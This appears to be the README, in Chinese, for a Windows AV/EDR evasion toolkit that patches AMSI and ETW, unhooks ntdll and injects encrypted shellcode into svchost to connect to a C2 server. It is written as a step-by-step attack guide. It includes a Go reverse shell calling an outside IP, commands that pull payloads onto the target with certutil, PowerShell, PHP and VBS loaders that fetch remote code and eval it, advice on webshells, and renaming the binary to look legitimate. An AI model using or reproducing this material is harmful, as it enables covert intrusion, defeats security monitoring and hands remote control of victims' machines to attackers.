# AV/EDR Evasion Toolkit

Windows 免杀工具，在被 AV/EDR 保护的主机上绕过安全检测，隐蔽加载 shellcode 上线 C2。

## 详细介绍

### 项目概述

EvasionToolkit 是一套完整的 Windows 终端对抗工具链，由 C# 原生编译的 EXE（主体）、Python 加密生成器、PowerShell 备用脚本三部分组成。核心目标：在受 AV/EDR 保护的 Windows 主机上，从静态免杀（文件落地不被杀）、行为免杀（执行过程不被拦）、到内存免杀（注入后不被扫）三层递进，最终实现 shellcode 隐蔽执行并上线 C2。

适用场景：
- 红队渗透中需要在目标机落地工具并上线 C2
- 内网横向移动时在跳板机上执行 Beacon
- 钓鱼 payload 投递后的第一阶段加载器
- 对抗环境下脚本/工具的安全落地与执行

### 核心设计理念

**1. 零静态特征**

所有敏感字符串（API 名称、DLL 名称、命令参数）使用两种 XOR 编码存储：
- `X()`：线性同余 XOR，用于 API 函数名（`kernel32.dll`、`VirtualAlloc` 等），运行时逐条 GetProcAddress 动态解析
- `Ds()`：Base64 + 滚动 XOR 双层编码，用于模式名和用户可见字符串

编译产物中不出现任何 `amsi.dll`、`AmsiScanBuffer`、`EtwEventWrite` 等明文，静态扫描无法通过字符串匹配判定恶意行为。同时 `PublishSingleFile=true` 编译为单文件，无依赖、无配置文件，减小落地指纹。

**2. 最小化 P/Invoke 导入表**

整个程序只静态导入 3 个 kernel32 函数：`LoadLibrary`、`GetProcAddress`、`VirtualProtect`。这三个函数是 .NET 运行时自身就要用的，任何 .NET 程序导入表中都有它们，不构成可疑特征。其余 15 个 Win32 API 全部通过 `GetProcAddress` 在运行时动态查找、转换为委托调用。

**3. 逐层解除检测能力（Defense Evasion Chain）**

按 AMSI → ETW → NTDLL Unhook → Shellcode Execution 的顺序逐层剥离 AV/EDR 的感知链：

| 阶段 | 对抗目标 | 原理 |
|------|---------|------|
| AMSI Patch | PowerShell/.NET 内存扫描 | 补丁 `AmsiScanBuffer` 返回 `E_INVALIDARG`，所有脚本引擎调用 AMSI 立即返回"无毒" |
| ETW Patch | EDR 事件摄取 | 补丁 `EtwEventWrite` 为 `xor rax,rax; ret`，.NET Assembly Load / 进程创建等事件全部静默 |
| NTDLL Unhook | EDR 用户态 Hook | 从磁盘读 `ntdll.dll` 的干净 `.text` 段覆盖内存中被 EDR 注入的 `jmp` 跳板，解除 syscall 劫持 |

这条链的先后顺序是经过设计的：先打 AMSI 确保自身不被扫描，再打 ETW 让后续操作不产生事件日志，最后还原 ntdll 让 EDR 的用户态钩子全部失效——此时再执行 shellcode，EDR 在用户态已完全"失明"。

**4. 隐蔽的执行代理（Callback Proxy Execution）**

不直接调用 `CreateThread`/`NtCreateThreadEx`（这两个是 EDR 重点 hook 的目标），而是通过 Windows 回调机制间接触发 shellcode：

- **EnumWindows 回调**：`EnumWindows(shellcode_addr, 0)` — 系统遍历窗口时回调你的 shellcode，调用栈干净（`user32!EnumWindows → win32u!NtUserEnumWindows → 你的 shellcode`）
- **Fiber 调度**：`ConvertThreadToFiber(0)` → `CreateFiber(0, shellcode, 0)` → `SwitchToFiber(fiber)` — 利用 fiber 调度机制执行，调用栈不像线程创建那样被重点关注
- **Early Bird APC**：`CreateProcess(SUSPENDED)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` → `ResumeThread` — 抢在进程初始化前的 APC 注入，shellcode 在目标进程入口点之前执行
- **Process Hollowing**：`CreateProcess(SUSPENDED)` → `NtUnmapViewOfSection(原镜像)` → `VirtualAllocEx` → `WriteProcessMemory(新shellcode)` → 修改线程上下文中 RIP → `ResumeThread` — 把一个合法进程"挖空"填入 shellcode，进程名/路径/签名完全合法

其中 EnumWindows 和 Fiber 两种方式在本进程内执行，没有跨进程操作，不触发 `OpenProcess`/`CreateRemoteThread` 的 hook；APC 和 Hollowing 方式注入到其他进程（如 svchost），利用合法进程掩藏自身。

**5. 静默加载加密 Shellcode**

shellcode 文件本身是 AES-256-CBC 密文（随机字节流），落地后无任何 PE/shellcode 特征。只在执行瞬间于内存中解密，解密后直接注入，不会在磁盘上留下明文 shellcode。Python 生成器每次使用 `os.urandom` 生成随机 256-bit 密钥，无法重放。

### 技术栈全景

```
                    攻击机                          |              目标机
                                                    |
  Sliver/Havoc/CS/msfvenom                          |
         │                                          |
         ▼                                          |
  payload.bin (raw shellcode)                       |
         │                                          |
         ▼                                          |
  generate_payload.py                               |
     ├─ AES-256-CBC 随机密钥加密                      |
     ├─ 可选 XOR 第二层加密                           |
     └─ 输出 payload_enc.bin + keys.txt              |
         │                                          |
         │  payload_enc.bin (密文，无特征)              |
         │  EvasionToolkit.exe (单文件，全混淆)         │
         │─────────────────────────────────────────▶│
                                                    │
                                              certutil/wget 落地至
                                              C:\Users\Public\
                                                    │
                                                    ▼
                                          EvasionToolkit.exe full
                                          payload_enc.bin svchost.exe
                                          <key> <iv>
                                                    │
                          ┌─────────────────────────┤
                          ▼                         ▼
                    [Stage 1] AMSI Patch      [Stage 2] ETW Patch
                    AmsiScanBuffer →           EtwEventWrite →
                    mov eax,0x80070057;ret     xor rax,rax;ret
                          │                         │
                          └─────────┬───────────────┘
                                    ▼
                            [Stage 3] NTDLL Unhook
                            从磁盘读取干净 ntdll.dll
                            覆盖内存中被 hook 的 .text 段
                                    │
                                    ▼
                            [Stage 4] AES 解密 shellcode
                            内存中解密，密钥用完即弃
                                    │
                                    ▼
                            [Stage 5] 进程注入执行
                            ├─ EnumWindows 回调 (本进程)
                            ├─ Fiber 调度 (本进程)
                            ├─ Early Bird APC (远程)
                            └─ Process Hollowing (远程)
                                    │
                                    ▼
                              C2 上线，Session 建立
```

### 与常见免杀方案对比

| 维度 | EvasionToolkit | Shellcode Loader (C) | PowerShell 单脚本 | Donut 直转 |
|------|---------------|---------------------|-------------------|-----------|
| AMSI 绕过 | 内置，内存补丁 | 需单独实现 | 需第一行嵌入 | 无 |
| ETW 绕过 | 内置，内存补丁 | 需单独实现 | 需单独实现 | 无 |
| NTDLL Unhook | 内置，PE 解析覆盖 | 需单独实现或间接 syscall | 无 | 无 |
| Shellcode 加密 | AES-256-CBC 支持 | 需自写 | 需自写 | 无 |
| 静态规避 | 全字符串混淆 | 需自行混淆 | 易被杀 | 易被杀 |
| 编译产物 | 单文件 ~70KB | 单文件 | 明文脚本 | 取决于输入 |
| 注入方式 | 4 种可选 | 通常 1-2 种 | 1-2 种 | 入口点执行 |
| 调用栈伪装 | EnumWindows/Fiber 回调 | 一般 CreateThread | 一般 CreateThread | 直接执行 |

### 对抗层级矩阵

```
Layer 1: 静态免杀 ─────────── 文件写入磁盘不被杀
  ├─ 敏感字符串 XOR/Base64 混淆存储
  ├─ API 动态解析（不导入敏感函数）
  ├─ PublishSingleFile 单文件，无依赖
  └─ shellcode 文件以 AES 密文形式落地

Layer 2: 加载免杀 ─────────── 进程启动/初始化不被拦
  ├─ .NET 程序以合法特征启动
  ├─ 仅导入 kernel32 的 3 个无害函数
  └─ 无可疑命令行参数（mode 名同样混淆）

Layer 3: 行为免杀 ─────────── 运行时操作不被拦
  ├─ AMSI 补丁 → 内存扫描失效
  ├─ ETW 补丁 → 事件摄取静默
  ├─ ntdll unhook → 用户态 hook 全部还原
  └─ 回调式执行 → 不触发 CreateThread/ResumeThread 告警

Layer 4: 驻留免杀 ─────────── 上线后不被扫出
  ├─ 注入合法进程（svchost.exe/dllhost.exe）
  ├─ 无新进程名出现
  └─ Beacon 流量走 HTTPS (Sliver) 或 mTLS
```

### 文件说明

| 文件 | 作用 |
|------|------|
| `Program.cs` | 核心免杀引擎 — AMSI/ETW/NTDLL Unhook 补丁 + 4 种 Shellcode 注入器，全部敏感字符串混淆 |
| `EvasionToolkit.csproj` | .NET 9 项目文件，编译目标 win-x64 单文件 |
| `generate_payload.py` | Shellcode 加密器 — AES-256-CBC + 可选 XOR 双层加密，自动生成即用命令和密钥 |
| `Invoke-Evasion.ps1` | PowerShell 版备用方案 — AMSI/ETW/ScriptBlockLogging 绕过 + 内存加载 + 远程注入 |
| `publish/EvasionToolkit.exe` | 已编译的免杀工具，可直接部署 |

## 完整架构

```
┌─────────────────────────────────────────────────────────┐
│                 EvasionToolkit.exe                      │
│                                                        │
│  Stage 1: AMSI Patch                                    │
│    补丁 AmsiScanBuffer → PowerShell/.NET 扫描失效        │
│                                                        │
│  Stage 2: ETW Patch                                     │
│    补丁 EtwEventWrite → EDR 收不到 .NET 加载事件         │
│                                                        │
│  Stage 3: NTDLL Unhook                                  │
│    从 C:\Windows\System32\ntdll.dll 覆盖 .text 段回原版    │
│    → EDR 在 ntdll 的 hook 全部失效                       │
│                                                        │
│  Stage 4: Shellcode 注入                                │
│    EnumWindows 回调 / Fiber / Early Bird APC / Hollow   │
│                                                        │
│  全程: 敏感字符串 XOR 加密存储，运行时逐条解密             │
└─────────────────────────────────────────────────────────┘
```

## 命令速查

```
EvasionToolkit.exe <mode> [args...]
```

| 模式 | 命令 | 说明 |
|------|------|------|
| `test` | `Et.exe test` | 内置测试，弹出计算器。0 依赖、0 文件落地 |
| `bypass-amsi` | `Et.exe bypass-amsi` | 打 AMSI + ETW 补丁，进程常驻 |
| `unhook` | `Et.exe unhook` | 仅还原 ntdll.dll .text 段 |
| `shellcode` | `Et.exe shellcode <file> [key] [iv]` | 绕过 + 当前进程执行 |
| `fiber` | `Et.exe fiber <file> [key] [iv]` | 绕过 + Fiber 方式执行 |
| `earlybird` | `Et.exe earlybird <file> <target> [key] [iv]` | 绕过 + Early Bird APC 注入 |
| `hollow` | `Et.exe hollow <file> <target> [key] [iv]` | 绕过 + Process Hollowing |
| `full` | `Et.exe full <file> <target> [key] [iv]` | 全链路: AMSI+ETW+Unhook+EarlyBird |

- `[key] [iv]` 可选，传入时自动 AES-256-CBC 解密 shellcode 文件

## 获取 Shellcode（5 种方式）

工具不限制 shellcode 来源，下面任何一种方式生成的 `.bin` 都能用。

### 1. Sliver（推荐 — 开源，免费，功能强）

```bash
# 安装
curl https://sliver.sh/install | bash

# 启动
sliver-server
sliver > operator --name myop --lhost 0.0.0.0

# 生成 shellcode（stageless，不需要二次下载）
sliver > generate --http https://your-domain.com --format shellcode --save payload.bin

# 或走 mTLS（更隐蔽）
sliver > generate --mtls your-domain.com:443 --format shellcode --save payload.bin

# 开监听
sliver > https
sliver > mtls

# 按需压缩/混淆
sliver > generate --http ... --format shellcode --evasion
```

### 2. Havoc（开源 C2，类 Cobalt Strike 体验）

```
# 生成 Demon agent
Demon » generate shellcode
  - Listener: 你的监听器
  - Arch: x64
  - Format: Raw
  - Output: /tmp/payload.bin
```

### 3. msfvenom（传统，需注意 staged/stageless 区别）

```bash
# stageless（推荐 — 下划线 _，全量内嵌，不做二次下载）
msfvenom -p windows/x64/meterpreter_reverse_https \
    LHOST=你的IP LPORT=443 EXITFUNC=thread \
    -f raw -o payload.bin

# 对应的 handler
# use exploit/multi/handler
# set PAYLOAD windows/x64/meterpreter_reverse_https

# ⚠ staged（斜杠 /，先发 stager 再拉完整 stage）
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=... -f raw -o payload.bin
# Handler: set PAYLOAD windows/x64/meterpreter/reverse_https
# 注意: staged 需要目标进程内打补丁，否则 stage 加载可能失败
```

### 4. Donut — 把任意 .exe 转成 shellcode

```bash
# 安装
git clone https://github.com/TheWover/donut && cd donut && make

# 把 Rubeus.exe 转 shellcode（带参数）
./donut -f Rubeus.exe -p "kerberoast /outfile:tgs.txt" -a 2 -o rubeus.bin

# 把 SharpHound.exe 转 shellcode
./donut -f SharpHound.exe -p "-c All --zipfilename loot.zip" -a 2 -o sharphound.bin

# 把 Sliver/CS beacon（exe 格式）转 shellcode
./donut -f my_agent.exe -a 2 -o payload.bin
```

### 5. 自定义程序 + Donut

```go
// rev.go
// 编译: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o rev.exe rev.go
// 转换: donut -f rev.exe -a 2 -o payload.bin

package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "192.168.111.180:443")
    cmd := exec.Command("cmd.exe")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    cmd.Run()
}
```

## 加密 Shellcode（攻击机操作）

无论哪种方式生成的 `.bin`，都建议加密后再传到目标机：

```bash
python generate_payload.py --file payload.bin
```

输出：

```
payload_output/
├── payload_enc.bin   ← AES-256-CBC 密文，落盘安全
└── keys.txt          ← 包含即用命令 + 密钥
```

`keys.txt` 内容示例：

```
=== EvasionToolkit 命令 (复制粘贴到目标机) ===
EvasionToolkit.exe full payload_enc.bin "C:\Windows\System32\svchost.exe" AB12CD34EF... AABBCCDD1122...

# 或 shellcode 模式:
EvasionToolkit.exe shellcode payload_enc.bin AB12CD34EF... AABBCCDD1122...

=== AES-256-CBC Keys ===
Key (hex): AB12CD34EF...
IV  (hex): AABBCCDD1122...
```

加密后的 `.bin` 是随机字节流，任何 AV 无法签名匹配。

## 完整实战流程

### Step 1: 攻击机 — 生成 + 加密

```bash
# 以 Sliver 为例
sliver > generate --http https://update.microsoft.com --format shellcode --save payload.bin

# 加密
python generate_payload.py --file payload.bin

# 把工具也放到一起
cp publish/EvasionToolkit.exe payload_output/

# 开 HTTP 服务
cd payload_output
python3 -m http.server 8080
```

### Step 2: 攻击机 — 开 C2 监听

```bash
# Sliver
sliver > https

# MSF
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter_reverse_https
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 443
msf6 > run
```

### Step 3: 目标机 — 下载

```powershell
certutil -urlcache -f http://你的IP:8080/EvasionToolkit.exe C:\Users\Public\svc.exe
certutil -urlcache -f http://你的IP:8080/payload_enc.bin C:\Users\Public\d.bin
```

### Step 4: 目标机 — 执行

```powershell
# keys.txt 里已经准备好了完整命令，直接粘贴
C:\Users\Public\svc.exe full C:\Users\Public\d.bin "C:\Windows\System32\svchost.exe" <key_hex> <iv_hex>
```

### Step 5: 效果

```
攻击机:
[*] Session opened: svchost.exe (PID: 3484)
[*] Active sessions:
  ID  Name        Transport   Remote Address
  1   svchost     https       192.168.111.1:49231

目标机:
任务管理器 → 多了一个 svchost.exe，和系统自带的混在一起，看不出异常
```

## 脚本 / 文件安全落地指南

PHP、Python、PowerShell、VBS 等脚本落地同样面临 AV 静态扫描。三种方案按需选用。

### 方案 A: 配合 EvasionToolkit（最简单）

先用 bypass-amsi 打补丁，再随便跑脚本，AMSI 不扫描：

```powershell
# 终端 1：常驻打补丁
C:\Users\Public\svc.exe bypass-amsi

# 终端 2：脚本随便跑，AMSI 不会拦
php C:\Users\Public\shell.php
powershell -f C:\Users\Public\script.ps1
python C:\Users\Public\agent.py
wscript C:\Users\Public\d.vbs
```

### 方案 B: AES 加密落地 + 小 loader 解密执行

脚本文件落盘是密文，Loader 很小且不包含敏感字符串，AV 不易杀。

#### PHP

```bash
# === 攻击机：加密 PHP 脚本 ===
python3 -c "
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os, base64

with open('shell.php', 'rb') as f:
    plain = f.read()
key = os.urandom(32)
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(plain, 16))
with open('shell_enc.bin', 'wb') as f:
    f.write(encrypted)
print(f'Key(hex): {key.hex().upper()}')
print(f'IV(hex):  {iv.hex().upper()}')
"
```

```bash
# === 攻击机：生成 PHP loader ===
cat > loader.php << 'PHPEOF'
<?php
$key = hex2bin("你的KEY_HEX");
$iv  = hex2bin("你的IV_HEX");
$enc = file_get_contents("shell_enc.bin");
$plain = openssl_decrypt($enc, "aes-256-cbc", $key, 0, $iv);
// 不写磁盘，直接在内存执行
eval($plain);
PHPEOF
```

```powershell
# === 目标机：落地 ===
# shell_enc.bin 是密文，loader.php 只有 key+eval（key 用 hex 形式 AV 扫不出来）
# 两个文件都不触发 AV
php C:\Users\Public\loader.php
```

#### PowerShell

```bash
# === 攻击机：加密 PS1 ===
python3 -c "
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

with open('script.ps1', 'rb') as f:
    plain = f.read()
key = os.urandom(32)
iv = os.urandom(16)
enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plain, 16))

with open('script_enc.bin', 'wb') as f:
    f.write(enc)

print(f'Key(hex): {key.hex().upper()}')
print(f'IV(hex):  {iv.hex().upper()}')
# base64 for inline use
import base64
print(f'Enc(base64): {base64.b64encode(enc).decode()}')
"
```

```powershell
# === 目标机：内存解密 + 不落地执行 ===
# 配合 bypass-amsi 终端或直接把 EvasionToolkit 跑起来
$key = [byte[]]@(0xXX, 0xXX, ...)  # 从 keys.txt 复制
$iv  = [byte[]]@(0xXX, 0xXX, ...)
$enc = [System.IO.File]::ReadAllBytes("C:\Users\Public\script_enc.bin")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv; $aes.Mode = "CBC"
$plain = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
$text = [System.Text.Encoding]::UTF8.GetString($plain)
Invoke-Expression $text
```

#### Python

```python
# === attacker: encrypt ===
# from Crypto.Cipher import AES, same as above

# === target: loader.py (落地不敏感) ===
import ctypes, base64, sys
key = bytes.fromhex("KEY_HEX")
iv  = bytes.fromhex("IV_HEX")
with open("script_enc.bin", "rb") as f:
    enc = f.read()
from Crypto.Cipher import AES
plain = AES.new(key, AES.MODE_CBC, iv).decrypt(enc)
exec(plain)
```

### 方案 C: 完全内存化（不落地任何脚本文件）

把脚本内容直接通过 HTTP 拉到内存执行，物理磁盘上不留脚本。

#### PowerShell（通过 IEX 远程加载）

```powershell
# === 攻击机：开 HTTP + 加密好的脚本 ===
# script_enc.bin 是 AES 密文

# === 目标机：一条命令，不落地 ===
$k=[byte[]]@(0xXX,...); $i=[byte[]]@(0xXX,...);
$e=(New-Object Net.WebClient).DownloadData("http://IP:8080/script_enc.bin");
$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$i;$a.Mode="CBC";
$p=$a.CreateDecryptor().TransformFinalBlock($e,0,$e.Length);
iex([Text.Encoding]::UTF8.GetString($p))
```

#### PHP（WebShell 场景）

```php
<?php
// 从远程拉取加密 payload，内存解密执行
$k = hex2bin("KEY_HEX");
$i = hex2bin("IV_HEX");
$e = file_get_contents("http://YOUR_IP:8080/shell_enc.bin");
$p = openssl_decrypt($e, "aes-256-cbc", $k, 0, $i);
eval($p);
```

#### VBS

```bash
# 攻击机：base64 + XOR 混淆
python3 -c "
import base64
with open('script.vbs', 'rb') as f:
    data = f.read()
key = 0x5A
enc = bytes(b ^ ((key + i * 7) & 0xFF) for i, b in enumerate(data))
b64 = base64.b64encode(enc).decode()
with open('payload_b64.txt', 'wb') as f:
    f.write(b64.encode())
print('Encoded payload saved')
"
```

```vbscript
' 目标机：loader.vbs（落地不包含实际逻辑）
Dim key_hex : key_hex = "KEY_HEX"
' 从远程拉 b64+XOR 密文 → 解码 → 执行
Dim http : Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.Open "GET", "http://YOUR_IP:8080/payload_b64.txt", False
http.Send
Dim b64 : b64 = http.ResponseText
' XOR 解码 → base64 解码 → Execute
' (省去具体实现细节)
```

### 总结：选择哪种方案

| 场景 | 推荐 | 理由 |
|------|------|------|
| 已有 EvasionToolkit 落地 | 方案 A | `bypass-amsi` 跑起来，随便玩 |
| 不能带二进制工具 | 方案 B | 脚本加密落地 + loader 小巧 |
| 高对抗环境，不上传任何工具 | 方案 C | 全内存，0 文件落地，但需要已有执行入口 |

---

## 各模式底层做了什么

### test
```
Patch AMSI → Patch ETW → WinExec("calc.exe", 1)
纯 P/Invoke，0 shellcode，0 VirtualAlloc，0 文件落地
验证工具能在目标环境正常跑通
```

### full
```
Patch AMSI → Patch ETW → Unhook ntdll
    → AES 解密 shellcode 文件（内存中）
    → CreateProcess(svchost.exe, SUSPENDED)
    → VirtualAllocEx + WriteProcessMemory
    → QueueUserAPC(shellcode, main_thread)
    → ResumeThread
    → beacon 在 svchost 体内上线
```

### unhook
```
读 C:\Windows\System32\ntdll.dll → 解析 PE → 找到 .text 段
    → 用磁盘上的干净 .text 覆盖内存中被 EDR hook 的 ntdll
    → EDR 下的 JMP/CALL hook 全部还原
```

## 免杀能力评估

| 目标 | 静态免杀 | 行为免杀 | 备注 |
|------|----------|----------|------|
| 火绒 | ✅ 已过 | ✅ test 模式已过 | 加密 payload + full 链待验证 |
| Windows Defender | 未测 | 未测 | Defender 关闭状态 |
| 360 | 未测 | 未测 | |
| Defender for Endpoint | 可能要加 | 需间接 syscall | EDR 级别产品有内核回调 |
| CrowdStrike | 不太可能过 | 不太可能过 | 需 Call Stack Spoofing + Sleep Obfuscation |

## 项目结构

```
av-evasion-toolkit/
├── EvasionToolkit.csproj   项目文件
├── Program.cs              C# 源码（全混淆）
├── Invoke-Evasion.ps1      PowerShell 版（备用）
├── generate_payload.py     Shellcode 加密工具
├── README.md               本文件
└── publish/
    └── EvasionToolkit.exe  编译好的免杀工具
```

## 编译

```powershell
cd av-evasion-toolkit
rm -rf bin obj publish
dotnet publish -c Release -r win-x64 --self-contained false -p:PublishSingleFile=true -o publish
# 输出: publish/EvasionToolkit.exe
```

## 常见问题

**Q: Session 上来就断（not valid）？**

staged payload（msfvenom 用 `/` 生成的）需要在目标进程内二次下载 stage。如果用 `full` 模式注入 svchost，补丁只打在 EvasionToolkit 进程里，svchost 体内没有补丁，stage 加载可能失败。

→ 解决方法：用 stageless payload（msfvenom 用 `_` 下划线）或 Sliver 的 `--format shellcode`

**Q: 改名有影响吗？**

没有。改文件名不影响功能：

```powershell
ren EvasionToolkit.exe svc.exe
ren EvasionToolkit.exe OneDrive.exe
ren EvasionToolkit.exe winupdate.exe
```

**Q: 怎么选模式和进程？**

```
快速测试           → test
需要不加补丁跑脚本  → bypass-amsi
简单上线（本进程）  → shellcode payload.bin <key> <iv>
隐蔽上线（推荐）    → full payload.bin "svchost.exe" <key> <iv>
注入已有进程        → Invoke-Evasion.ps1 -ShellcodePath ... -InjectPid <PID>
```

**Q: 目标进程崩溃怎么办？**

换一个宿主进程：

```
svchost.exe  → 最推荐，多实例不奇怪
dllhost.exe  → COM 代理，天然常驻
RuntimeBroker.exe → Win10 自带，常驻
rundll32.exe → 也常见，但偶尔会被杀软关照
```

**Q: shellcode 加密后的文件多大？**

AES 使用 PKCS7 填充，加密后最多增加 16 字节。838 字节原始 payload 加密后约 848 字节。
